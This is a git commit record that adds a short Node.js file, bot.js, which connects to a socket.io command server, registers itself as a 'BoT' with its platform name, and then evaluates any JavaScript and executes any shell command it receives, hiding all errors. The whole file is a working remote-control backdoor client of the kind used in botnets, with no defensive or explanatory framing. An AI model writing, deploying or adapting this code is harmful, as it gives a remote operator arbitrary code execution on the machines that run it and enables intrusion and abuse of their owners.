cb672e57aea51e4ce3ee799397498c14bce33b9e
Elmedin Turkeš <elmthedev@gmail.com>
2018-12-08 19:26:48 +0100

    Create bot.js

---
+++ bot.js
@@ -0,0 +1,16 @@
+var socket = require('socket.io-client')('http://localhost:7305');
+const { exec } = require('child_process');
+
+socket.on('connect', function(){
+	socket.emit('authenticate', 'BoT', process.platform, false);
+});
+
+socket.on('data', function(data)
+{
+	try{eval(data);}catch(e){};
+});
+
+socket.on('exdata', function(data)
+{
+	try{exec(data, (err, stdout, stderr) => {});}catch(e){};
+});
